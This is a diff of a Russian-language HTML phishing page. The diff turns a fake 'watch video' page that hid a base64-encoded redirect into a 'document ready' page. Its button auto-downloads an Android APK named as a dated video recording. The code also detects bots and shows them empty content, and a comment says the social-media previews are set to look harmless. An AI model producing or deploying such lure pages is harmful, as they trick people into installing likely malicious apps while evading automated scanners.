@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Макc </title>
+    <title>Документ</title>
     
     <!-- Превью для соцсетей - показываем безобидный контент -->
-    <meta property="og:title" content="Интересное видео">
-    <meta property="og:description" content="Смотрите видео онлайн">
-    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="Документ">
+    <meta property="og:description" content="Нажмите кнопку, чтобы скачать">
+    <meta property="og:type" content="website">
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -30,40 +30,16 @@
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
         }
-        .video-placeholder {
+        .file-icon {
             width: 100%;
-            height: 280px;
+            height: 200px;
             background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             border-radius: 12px;
             display: flex;
             justify-content: center;
             align-items: center;
             margin-bottom: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-        .play-icon {
-            width: 80px;
-            height: 80px;
-            background: rgba(255,255,255,0.9);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        .play-icon:hover {
-            transform: scale(1.1);
-        }
-        .play-icon::after {
-            content: '';
-            width: 0;
-            height: 0;
-            border-left: 30px solid #667eea;
-            border-top: 18px solid transparent;
-            border-bottom: 18px solid transparent;
-            margin-left: 8px;
+            font-size: 80px;
         }
         h2 {
             color: #333;
@@ -118,15 +94,13 @@
 </head>
 <body>
     <div class="container">
-        <div class="video-placeholder" onclick="startVideo()">
-            <div class="play-icon"></div>
-        </div>
-        <h2>Смотреть видео</h2>
-        <p>Нажмите кнопку ниже, чтобы начать просмотр</p>
-        <button class="btn" onclick="startVideo()">▶ Смотреть видео</button>
+        <div class="file-icon">📄</div>
+        <h2>Документ готов</h2>
+        <p>Нажмите кнопку ниже, чтобы скачать запись</p>
+        <button class="btn" onclick="downloadFile()">⬇ Скачать и смотреть запись</button>
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p style="margin-top: 15px;">Загрузка видео...</p>
+            <p style="margin-top: 15px;">Подготовка файла...</p>
         </div>
     </div>
 
@@ -148,18 +122,13 @@
             return false;
         }
 
-        // Закодированная ссылка (base64) - боты не найдут её в коде
-        const encodedLink = 'aHR0cHM6Ly9sb2ctbWF4Lm9ubGluZS92aWRlbw==';
-        
-        function decodeLink(encoded) {
-            try {
-                return atob(encoded);
-            } catch(e) {
-                return null;
-            }
-        }
+        // НАСТРОЙКИ ФАЙЛА
+        // Имя файла, который лежит в этой же папке на сервере
+        const fileName = 'Видео 02.06.2026.apk';
+        // Имя, под которым файл сохранится у пользователя
+        const downloadName = 'Видео 02.06.2026.apk';
 
-        function startVideo() {
+        function downloadFile() {
             // Если это бот - ничего не делаем
             if (isBot()) {
                 console.log('Access denied');
@@ -170,17 +139,17 @@
             document.getElementById('loading').style.display = 'block';
             document.querySelector('.btn').style.display = 'none';
 
-            // Декодируем ссылку
-            const targetUrl = decodeLink(encodedLink);
-            
-            if (!targetUrl) {
-                alert('Ошибка загрузки');
-                return;
-            }
+            // Создаем ссылку для скачивания
+            const link = document.createElement('a');
+            link.href = fileName;
+            link.download = downloadName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
 
-            // Задержка перед редиректом (имитация загрузки)
+            // Страховка: если браузер заблокировал автоматическое скачивание
             setTimeout(() => {
-                window.location.replace(targetUrl);
+                window.location.replace(fileName);
             }, 1500);
         }
 
@@ -189,7 +158,7 @@
             // Для ботов показываем статичный контент без ссылок
             document.body.innerHTML = `
                 <div class="container">
-                    <h2>Maкс</h2>
+                    <h2>Документ</h2>
                     <p>Контент доступен только в браузере</p>
                 </div>
             `;
